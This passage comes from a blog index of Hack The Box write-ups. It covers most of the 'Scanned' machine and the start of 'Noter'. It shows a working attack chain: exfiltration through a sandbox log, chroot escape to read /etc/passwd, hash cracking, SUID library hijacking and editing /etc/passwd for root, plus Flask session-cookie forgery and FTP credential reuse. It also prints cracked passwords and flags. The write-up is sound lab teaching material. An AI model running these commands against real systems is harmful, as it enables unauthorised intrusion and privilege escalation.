output, we will see the syscall reported:\nWe notice that not all registers are shown. That\u0026rsquo;s because sys_execve only needs three arguments. If we wanted more, we could have used sys_clone, which uses five registers, but I will still use sys_execve, because I will be using only ret as output.\nNow we need to parse the information we want to exfiltrate as hexadecimal values and set the ret value accordingly. This is an example to exfiltrate the listing of the current working directory:\n#include \u0026lt;dirent.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; typedef struct __attribute__((__packed__)) { unsigned long rax; unsigned long rdi; unsigned long rsi; unsigned long rdx; unsigned long r10; unsigned long r8; unsigned long r9; unsigned long ret; } registers; void log_syscall(unsigned long ret) { registers result; result.rax = 0x3b; result.rdi = 0; result.rsi = 0; result.rdx = 0; result.r10 = 0; result.r8 = 0; result.r9 = 0; result.ret = ret; int fd = open(\"/log\", O_CREAT|O_RDWR|O_APPEND, 0777); if (fd == -1) { return; } write(fd, \u0026amp;result, sizeof(registers)); close(fd); } void read_file(char* path) { unsigned long ret = 0l; char ret_string[8] = {0, 0, 0, 0, 0, 0, 0, 0}; int fd = open(path, O_RDONLY); while (read(fd, ret_string, 8)) { ret = 0l; for (int i = 0; i \u0026lt; 8; i++) { ret \u0026lt;\u0026lt;= 8; ret += ret_string[i]; ret_string[i] = 0; } log_syscall(ret); } close(fd); } int main() { DIR* dr; struct dirent *de; FILE* fp; fp = fopen(\"tmp_file\", \"wb\"); dr = opendir(\".\"); while ((de = readdir(dr)) != NULL) { fprintf(fp, \"%s\\n\", de-\u0026gt;d_name); } closedir(dr); fclose(fp); read_file(\"tmp_file\"); return 0; }  Using curl and some filtering we can extract the information:\n$ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x7573720a2e0a746d\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x705f66696c650a6c\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x69620a7573657270\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x726f670a62696e0a\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x70726f630a2e2e0a\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x6c696236340a6c6f\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x670a000000000000\u0026lt;/pre\u0026gt; $ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve | awk -F = '{ print $3 }' 0x7573720a2e0a746d\u0026lt;/pre\u0026gt; 0x705f66696c650a6c\u0026lt;/pre\u0026gt; 0x69620a7573657270\u0026lt;/pre\u0026gt; 0x726f670a62696e0a\u0026lt;/pre\u0026gt; 0x70726f630a2e2e0a\u0026lt;/pre\u0026gt; 0x6c696236340a6c6f\u0026lt;/pre\u0026gt; 0x670a000000000000\u0026lt;/pre\u0026gt; $ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve | awk -F = '{ print $3 }' | sed 's/\u0026lt;\\/pre\u0026gt;//g' 0x7573720a2e0a746d 0x705f66696c650a6c 0x69620a7573657270 0x726f670a62696e0a 0x70726f630a2e2e0a 0x6c696236340a6c6f 0x670a000000000000 $ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve | awk -F = '{ print $3 }' | sed 's/\u0026lt;\\/pre\u0026gt;//g' | awk -F x '{ printf \"%16s\\n\", $2 }' 7573720a2e0a746d 705f66696c650a6c 69620a7573657270 726f670a62696e0a 70726f630a2e2e0a 6c696236340a6c6f 670a000000000000 $ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve | awk -F = '{ print $3 }' | sed 's/\u0026lt;\\/pre\u0026gt;//g' | awk -F x '{ printf \"%16s\\n\", $2 }' | xxd -r -p usr . tmp_file lib userprog bin proc .. lib64 log  We can follow the same process to read files from the sandbox environment. In the end, I decided to build a Bash script that compiles a binary with the file to read or directory to list, uploads it and extracts all the information automatically. This script is called exploit.sh (detailed explanation here):\n$ bash exploit.sh [!] Usage: bash exploit.sh \u0026lt;host\u0026gt; \u0026lt;f|d\u0026gt; \u0026lt;path-to-file|dir\u0026gt; $ bash exploit.sh 127.0.0.1:8000 d / usr . tmp_file lib userprog bin proc .. lib64 log  Now we can start enumerating the /proc directory in the remote machine. As explained before, there is a misconfiguration because the sandbox binary mounts /proc directory into the chroot environment, so we can access it from the sandbox:\n$ bash exploit.sh 10.10.11.141 d /proc . .. fb fs bus dma irq mpt net sys tty acpi keys kmsg misc mtrr stat iomem kcore locks swaps crypto driver mounts uptime vmstat cgroups cmdline cpuinfo devices ioports loadavg meminfo modules sysvipc version consoles kallsyms pressure slabinfo softirqs zoneinfo buddyinfo diskstats key-users schedstat interrupts kpagecount kpageflags partitions timer_list execdomains filesystems kpagecgroup sched_debug vmallocinfo pagetypeinfo dynamic_debug sysrq-trigger self thread-self 1 2 3  There are three different process identifiers (PID): 1, 2 and 3. We are able to list the file descriptors used by those PID:\n$ bash exploit.sh 10.10.11.141 d /proc/1/fd . .. 0 1 2 3 $ bash exploit.sh 10.10.11.141 d /proc/2/fd . .. 0 1 2 3 4 $ bash exploit.sh 10.10.11.141 d /proc/3/fd . .. 0 1 2 3  We notice that if we list the file descriptor number 3 (as a directory) we are listing the jails directory:\n$ bash exploit.sh 10.10.11.141 d /proc/1/fd/3 7d431ab8af5ab635e048e40f36f69536 . 720e0160ff47fcd4da968b89de05d5e9 .. $ bash exploit.sh 10.10.11.141 d /proc/3/fd/3 . 720e0160ff47fcd4da968b89de05d5e9 ..  For some reason, we get more information with /proc/1/fd/3, so I will continue using this. Actually, we can climb up directories, escaping from chroot environment:\n$ bash exploit.sh 10.10.11.141 d /proc/1/fd/3/.. jails . .. sandbox $ bash exploit.sh 10.10.11.141 f /proc/1/fd/3/../../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin clarence:x:1000:1000:clarence,,,:/home/clarence:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin sandbox:x:1001:1001::/home/sandbox:/usr/sbin/nologin  Foothold on the machine Nice, now we have a system user called clarence and we can read files from the server. Let\u0026rsquo;s enumerate a bit more the web server:\n$ bash exploit.sh 10.10.11.141 d /proc/1/fd/3/../.. scanner . malscanner .. viewer templates .gitignore sandbox static manage.py uploads uwsgi_params requirements.txt malscanner.db  There is a SQLite database file called malscanner.db. Let\u0026rsquo;s try to download it and open it:\n$ bash exploit.sh 10.10.11.141 f /proc/1/fd/3/../../malscanner.db \u0026gt; malscanner.db $ file malscanner.db malscanner.db: SQLite 3.x database, last written using SQLite version 3033745, file counter 34, database pages 32, cookie 0x42, schema 4, UTF-8, version-valid-for 34 $ sqlite3 malscanner.db SQLite version 3.37.0 2021-12-09 01:34:53 Enter \".help\" for usage hints. sqlite .tables Error: database disk image is malformed sqlite .exit  It is corrupt\u0026hellip; But we can take a look at the strings inside, and find an MD5 hash for clarence:\n$ strings malscanner.db | grep clarence md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf2021-09-14 18:39:55.237074clarence2021-09-14 18:36:46.227819 clarence  Since it is in Django format and contains a salt, I decided to use a custom Go script to crack it using rockyou.txt: crack.go (detailed explanation here):\n$ go run crack.go $WORDLISTS/rockyou.txt 'md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf' [*] Algorithm: md5 [*] Salt: kL2cLcK2yhbp3za4w3752m [*] Hash: 9886e17b091eb5ccdc39e436128141cf [+] Cracked: onedayyoufeellikecrying  And we got a password. Fortunately, this password is reused for SSH. And there we have user.txt flag:\n$ ssh clarence@10.10.11.141 clarence@10.10.11.141's password: clarence@scanned:~$ cat user.txt 8e6287143ba5f57564bd0fb2ac7f733e  Library Hijacking Now we have the ability to run the sandbox from the machine and perform more actions with prepared malware.\nFor instance, we can run SUID binaries and copy shared libraries from inside the jail so that the malware can use them and run commands as root:\nclarence@scanned:~$ find / -perm -4000 2/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/chsh /usr/bin/su /usr/bin/fusermount /usr/bin/passwd /usr/bin/sudo /usr/bin/mount /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/chfn /usr/bin/umount  Let\u0026rsquo;s check which shared libraries they need to run properly: fusermount needs the libraries that are already inside the jail, which are needed for /bin/sh as well:\nclarence@scanned:~$ ldd /usr/bin/fusermount linux-vdso.so.1 (0x00007ffe36170000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1fb50e4000) /lib64/ld-linux-x86-64.so.2 (0x00007f1fb52ba000) clarence@scanned:~$ ldd /bin/sh linux-vdso.so.1 (0x00007ffe3d5a6000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc39def7000) /lib64/ld-linux-x86-64.so.2 (0x00007fc39e0e5000)  To craft a malicious Glibc shared library, we can use fakelib.sh. First, we must download the libc.so.6 library to our attacker machine.\nHowever, using fakelib.sh on libc.so.6 might not run correcty. After some tests, I found that /usr/lib/openssh/ssh-keysign is SUID and uses libz.so.1:\nclarence@scanned:~$ ldd /usr/lib/openssh/ssh-keysign /usr/lib/openssh/ssh-keysign: linux-vdso.so.1 (0x00007ffdbe9e8000) libcrypto.so.1.1 = /lib/x86_64-linux-gnu/libcrypto.so.1.1 (0x00007f72529b4000) libz.so.1 = /lib/x86_64-linux-gnu/libz.so.1 (0x00007f7252997000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007f72527d2000) libdl.so.2 = /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f72527cc000) libpthread.so.0 = /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f72527aa000) /lib64/ld-linux-x86-64.so.2 (0x00007f7252d27000)  So we need to download libz.so.1:\nclarence@scanned:~$ cd / clarence@scanned:/$ python3 -m http.server 1234 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...  $ wget -q 10.10.11.141:1234/lib/x86_64-linux-gnu/libz.so.1  This library libz.so.1 won\u0026rsquo;t cause errors with fakelib.sh (maybe because it is smaller than libc.so.6). Now we can craft a fake library to see if the attack works:\n$ bash fakelib.sh -l libz.so.1 -o fakelibz.so.1 -g Generating fake library under fakelibz.so.1 $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  clarence@scanned:/$ cd /tmp clarence@scanned:/tmp$ curl 10.10.17.44/fakelibz.so.1 -so .libz.so.1  We need to use a Bash script (.copy.sh) to run it right after the sandbox binary in order to copy all the needed files into the jail:\n#!/usr/bin/env bash dir=/var/www/malscanner/sandbox/jails for jail in $(ls $dir); do cp /lib/x86_64-linux-gnu/libcrypto.so.1.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libdl.so.2 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libpthread.so.0 $dir/$jail/lib/x86_64-linux-gnu/ cp /tmp/.libz.so.1 $dir/$jail/lib/x86_64-linux-gnu/libz.so.1 done  And the malware binary will be compiled from this simple C script (.exploit.c):\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { sleep(2); system(\"/proc/1/fd/3/../../../../../usr/lib/openssh/ssh-keysign\"); return 0; }  Notice that we are running ssh-keysign escaping from chroot, so that it executes as a SUID binary.\nAfter writing them on the machine, we must run sandbox and right after run the Bash script (notice that I added the sleep(2) to have some time in between). It is kind of a race condition. We will need two different SSH sessions:\n$ ssh clarence@10.10.11.141 clarence@10.10.11.141's password: clarence@scanned:~$ cd /var/www/malscanner/sandbox clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit  clarence@scanned:/tmp$ bash .copy.sh  And we will see this output:\nclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit Library hijacked! Exited Kill err: (3)  So the attack has worked. Now we can run a custom command using fakelib.sh. The script provides the use of bash setting UID/GID to EUID/EGID:\n$ bash fakelib.sh -l libz.so.1 -o fakelibz.so.1 -g -p bash Generating fake library under fakelibz.so.1 $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  clarence@scanned:/tmp$ curl 10.10.17.44/fakelibz.so.1 -so .libz.so.1  Moreover, we need to copy /bin/bash and more shared libraries into the jail:\nclarence@scanned:/tmp$ ldd /bin/bash linux-vdso.so.1 (0x00007fff80bec000) libtinfo.so.6 = /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fd3ac155000) libdl.so.2 = /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fd3ac14f000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd3abf8a000) /lib64/ld-linux-x86-64.so.2 (0x00007fd3ac2c4000)  So this is the updated .copy.sh:\n#!/usr/bin/env bash dir=/var/www/malscanner/sandbox/jails for jail in $(ls $dir); do cp /lib/x86_64-linux-gnu/libcrypto.so.1.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libdl.so.2 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libpthread.so.0 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libtinfo.so.6 $dir/$jail/lib/x86_64-linux-gnu/ cp /bin/bash $dir/$jail/bin cp /tmp/.libz.so.1 $dir/$jail/lib/x86_64-linux-gnu/libz.so.1 done  Now we perform the attack again:\nclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit  clarence@scanned:/tmp$ bash .copy.sh  clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit bash-5.1# Killed subprocess Exited  Notice the #, so we got bash executed as root, but it gets killed after 5 seconds\u0026hellip;\nPrivilege escalation In order to get a proper shell as root, I decided to modify /etc/passwd and set a given password for root using openssl (DES Unix format):\n$ openssl passwd 7rocky gf2QeNVUpedfI  To modify /etc/passwd I will use sed, so again I will need to copy /usr/bin/sed and more shared libraries into the jail:\nclarence@scanned:/tmp$ ldd /usr/bin/sed linux-vdso.so.1 (0x00007fffcbeea000) libacl.so.1 = /lib/x86_64-linux-gnu/libacl.so.1 (0x00007fe73de49000) libselinux.so.1 = /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fe73de1d000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe73dc58000) libpcre2-8.so.0 = /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fe73dbc0000) libdl.so.2 = /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe73dbba000) /lib64/ld-linux-x86-64.so.2 (0x00007fe73de7a000) libpthread.so.0 = /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe73db98000)  This is the updated .copy.sh:\n#!/usr/bin/env bash dir=/var/www/malscanner/sandbox/jails for jail in $(ls $dir); do cp /lib/x86_64-linux-gnu/libacl.so.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libcrypto.so.1.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libdl.so.2 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libpcre2-8.so.0 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libpthread.so.0 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libselinux.so.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libtinfo.so.6 $dir/$jail/lib/x86_64-linux-gnu/ cp /bin/bash $dir/$jail/bin cp /usr/bin/sed $dir/$jail/bin cp /tmp/.libz.so.1 $dir/$jail/lib/x86_64-linux-gnu/libz.so.1 done  We need to copy this command into clipboard in order to paste it as soon as we get the root shell (notice that we use /proc/1/fd/3/../../../../../etc/passwd to escape from chroot again):\n/bin/sed -i s/root:x/root:gf2QeNVUpedfI/g /proc/1/fd/3/../../../../../etc/passwd  Now we perform the library hijacking attack again:\nclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit  clarence@scanned:/tmp$ bash .copy.sh  Quickly, copy the command:\nclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit Exited bash-5.1# /bin/sed -i s/root:x/root:gf2QeNVUpedfI/g /proc/1/fd/3/../../../../../etc/passwd bash-5.1# Kill err: (3)  And\u0026hellip;\nclarence@scanned:/tmp$ head -1 /etc/passwd root:gf2QeNVUpedfI:0:0:root:/root:/bin/bash  We modified /etc/passwd, so we have access as root (using password 7rocky):\nclarence@scanned:/tmp$ su root Password: root@scanned:/tmp# cat /root/root.txt 8f587d54e14d5747055bb717dd2cc520  ","image":"/images/HTB/Scanned/Scanned.png","permalink":"https://7rocky.github.io/en/htb/scanned/","section":"htb","summary":"Hack The Box. Linux. Insane machine. This machine has a website that is able to analyze malware binaries. Analyzing the sandbox C code, we notice that we can use a log file to exfiltrate information through the web server report, and also abuse a misconfiguration to escape from chroot. Then, we can read a SQLite database file and extract a hashed password, which is reused for SSH. Once inside the machine, we are able to run a SUID binary from inside the sandbox and copy a malicious shared library so that the SUID binary runs Bash as root. Deep knowledge about Linux, programming in C and Bash, code audit experience and escaping techniques is needed in order to compromise this machine. This write-up uses a custom Bash script with an embedded C program to list directories and read files from the server and also a Go program to crack a hashed password","time":20,"title":"Scanned"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.160   Release: 07 / 05 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.160 -p 21,22,5000 Nmap scan report for 10.10.11.160 Host is up (0.052s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA) | 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA) |_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519) 5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10) |_http-title: Noter Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.47 seconds  This machine has ports 21 (FTP), 22 (SSH) and 5000 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.160:5000, we have this website:\nThe first thing we can to is register a new account as rocky:\nAnd then log in:\nNow we have access to our personal dashboard:\nIt seems that there is a VIP subscription, but it is disabled:\nWe can also add a new note:\nHere we can try common vulnerabilities like Server-Side Template Injection (SSTI) or Cross-Site Scripting (XSS). In fact, the tool that handles the notes is CKEditor:\nThis version of CKEditor (4.6.2) has a vulnerability of XSS (more information at snyk.io). Nevertheless, there is no one reading our notes, so the XSS won\u0026rsquo;t be useful for exploitation.\nAt this point, we can try to obtain the back-end technology. The Server header is Werkzeug/2.0.2 Python/3.8.10, which means that the back-end tehnology is probably Flask. Moreover, we have a session cookie that is common in Flask, and the HTTP response message is in capital letters (302 FOUND):\n$ curl 10.10.11.160:5000/dashboard -I HTTP/1.0 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 218 Location: http://10.10.11.160:5000/login Vary: Cookie Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVW5hdXRob3JpemVkLCBQbGVhc2UgbG9naW4iXX1dfQ.YtMgNg.FAhOFDdpcAg905AbEook1WRrB4U; HttpOnly; Path=/ Server: Werkzeug/2.0.2 Python/3.8.10 Date: Sat, 16 Jul 2022 20:31:50 GMT  We can take our own session cookie and decode it using flask-unsign:\n$ flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMW3Q.11eEHt1GC3R0gKwJCFYa5euDte8 {'logged_in': True, 'username': 'rocky'}  This tool is able to perform a brute force attack in order to extract the secret key used to sign cookies:\n$ flask-unsign --unsign --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMW3Q.11eEHt1GC3R0gKwJCFYa5euDte8 [*] Session decodes to: {'logged_in': True, 'username': 'rocky'} [*] No wordlist selected, falling back to default wordlist.. [*] Starting brute-forcer with 8 threads.. [*] Attempted (2048): -----BEGIN PRIVATE KEY-----*** [+] Found secret key after 17408 attemptsQtX/puoAECjC 'secret123'  There it is (secret123). At this point, we can forge session cookies. However, we don\u0026rsquo;t know any valid user. If we try common ones like admin or administrator, they are invalid:\n$ flask-unsign --sign --cookie \"{'logged_in': True, 'username': 'admin'}\" --secret secret123 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YtMdfA.W2r5MJWyB2eQCgY4oCYC8GEv0g0 $ flask-unsign --sign --cookie \"{'logged_in': True, 'username': 'administrator'}\" --secret secret123 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW5pc3RyYXRvciJ9.YtMdkw.XbITVqjTiqkQdmH50xODDdubJg0  One way of enumerating users is forge session cookies using a wordlist and then use ffuf to check each cookie:\n$ for name in $(cat $WORDLISTS/names.txt); do flask-unsign --sign --cookie \"{'logged_in': True, 'username': '$name'}\" --secret secret123; done \u0026gt; sessions.txt $ ffuf -w sessions.txt -u http://10.10.11.160:5000/dashboard -H 'Cookie: session=FUZZ' -mc 200 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtMfew._xogDzgiDE-mwbolv2fbRKt28NI [Status: 200, Size: 2444, Words: 565, Lines: 83, Duration: 90ms] eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMi1A.42ax8lWMfqrz4CVh9oKkhuqB6eU [Status: 200, Size: 3230, Words: 807, Lines: 109, Duration: 143ms]  Alright, let\u0026rsquo;s see what users are these:\n$ flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtMfew._xogDzgiDE-mwbolv2fbRKt28NI {'logged_in': True, 'username': 'blue'} $ flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMi1A.42ax8lWMfqrz4CVh9oKkhuqB6eU {'logged_in': True, 'username': 'rocky'}  Well, rocky is my user (it appears in the wordlist). If we use the session cookie for blue we see a different dashboard (a VIP one):\nThis are blue\u0026rsquo;s notes:\nThe first one is pretty interesting because we can get a password (blue@Noter!) and another username (ftp_admin):\nThe second note is not so interesting:\nWe can try to forge a session cookie for ftp_admin, but it does not work.\nAs a VIP member, we can import notes in Markdown (we can try different extensions like .txt, .html until we find out that .md is valid):\nAnd we can also export notes from Markdown to PDF:\nFTP enumeration At this point, we can enumerate the FTP server. We can access using credentials blue:blue@Noter!:\n$ ftp blue@10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files -rw-r--r-- 1 1002 1002 12569 Dec 24 2021 policy.pdf 226 Directory send OK. ftp\u0026gt; get policy.pdf 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for policy.pdf (12569 bytes). WARNING! 286 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 12569 bytes received in 0,0374 seconds (329 kbytes/s) ftp\u0026gt; cd files 250 Directory successfully changed. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK.  The only thing we have is a PDF file called policy.pdf. Although ASCII mode is enabled (not binary mode), the PDF file is correct. In this file, we can see an interesting sentence:\n Default user-password generated by the application is in the format of \u0026ldquo;username@site_name!\u0026rdquo; (This applies to all your applications)\n The password for blue matches with the above rule. Let\u0026rsquo;s check if it matches for ftp_admin as well. In the website it does not work, but we can access FTP with the default credentials:\n$ ftp ftp_admin@10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip -rw-r--r-- 1 1003 1003 26298 Dec 01 2021 app_backup_1638395546.zip 226 Directory send OK. ftp\u0026gt; get app_backup_1638395546.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes). WARNING! 100 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 26298 bytes received in 0,102 seconds (252 kbytes/s)  Here we will have a problem because the ZIP files we found will be corrupt (as a result of ASCII mode in FTP):\n$ unzip -l app_backup_1638395546.zip Archive: app_backup_1638395546.zip error [app_backup_1638395546.zip]: missing 3 bytes in zipfile (attempting to process anyway) error [app_backup_1638395546.zip]: start of central directory not found; zipfile corrupt. (please check that you have transferred or created the zipfile in the appropriate BINARY mode and that you have compiled UnZip properly)  One way of getting them nice is using curl:\n$ curl ftp://'ftp_admin:ftp_admin%40Noter!'@10.10.11.160/ -rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip -rw-r--r-- 1 1003 1003 26298 Dec 01 2021 app_backup_1638395546.zip  So we can download them:\n$ curl ftp://'ftp_admin:ftp_admin%40Noter!'@10.10.11.160/app_backup_1635803546.zip -so app_backup_1635803546.zip $ curl ftp://'ftp_admin:ftp_admin%40Noter!'@10.10.11.160/app_backup_1638395546.zip -so app_backup_1638395546.zip  Both ZIP archives appear to contain the same files:\n$ unzip -l app_backup_1638395546.zip Archive: app_backup_1638395546.zip Length Date Time Name --------- ---------- ----- ---- 13507 12-26-2021 22:49 app.py 0 12-26-2021 22:45 misc/ 0 12-26-2021 17:10 misc/attachments/ 46832 12-25-2021 13:09 misc/package-lock.json 0 12-25-2021 13:09 misc/node_modules/ 169 12-26-2021 22:45 misc/md-to-pdf.js 0 12-21-2021 14:15 templates/ 0 12-17-2021 14:51 templates/includes/ 393 12-15-2021 22:07 templates/includes/_messages.html 1229 12-23-2021 11:54 templates/includes/_navbar.html 238 12-15-2021 22:07 templates/includes/_formhelpers.html 503 12-19-2021 20:25 templates/import_note.html 246 12-18-2021 16:44 templates/upgrade.html 816 12-21-2021 20:47 templates/export_note.html 393 12-21-2021 14:15 templates/note.html 537 12-15-2021 22:07 templates/about.html 755 12-15-2021 22:07 templates/register.html 943 12-23-2021 11:54 templates/dashboard.html 242 12-17-2021 14:56 templates/notes.html 525 12-23-2021 15:03 templates/home.html 641 12-23-2021 14:57 templates/layout.html 466 12-16-2021 19:29 templates/add_note.html 467 12-17-2021 14:55 templates/edit_note.html 1036 12-21-2021 16:16 templates/vip_dashboard.html 521 12-17-2021 22:32 templates/login.html --------- ------- 70459 25 files  But if we check differences, we see that 